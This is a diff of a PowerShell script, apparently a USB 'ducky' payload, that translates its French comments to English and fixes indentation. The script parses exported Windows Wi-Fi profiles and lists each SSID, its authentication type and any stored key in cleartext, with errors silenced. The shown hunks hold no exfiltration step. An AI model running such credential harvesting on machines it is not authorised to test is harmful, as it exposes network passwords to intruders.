@@ -1,4 +1,4 @@
-﻿# Lab / machine autorisée : export Wi‑Fi lisible (SSID, auth, clé si présente).
+# Lab authorized machines only: WiFi export (SSID, auth, key if present).
 $ErrorActionPreference = 'SilentlyContinue'
 $d = Join-Path $env:TEMP 'wlan-ducky'
 New-Item -ItemType Directory -Force -Path $d | Out-Null
@@ -12,7 +12,7 @@ $lines.Add('')
 Get-ChildItem -LiteralPath $d -Filter '*.xml' | Sort-Object Name | ForEach-Object {
     [xml]$x = Get-Content -LiteralPath $_.FullName
     $wp = $x.WLANProfile
-  if (-not $wp) { return }
+    if (-not $wp) { return }
 
     $name = $wp.name
     $auth = $wp.MSM.security.authEncryption.authentication
@@ -24,7 +24,7 @@ Get-ChildItem -LiteralPath $d -Filter '*.xml' | Sort-Object Name | ForEach-Objec
     if ($key) {
         $lines.Add(('Key:  {0}' -f $key))
     } else {
-        $lines.Add('Key:  (ouverte / pas de clé enregistrée)')
+        $lines.Add('Key:  (open / no stored key)')
     }
     $lines.Add('')
 }
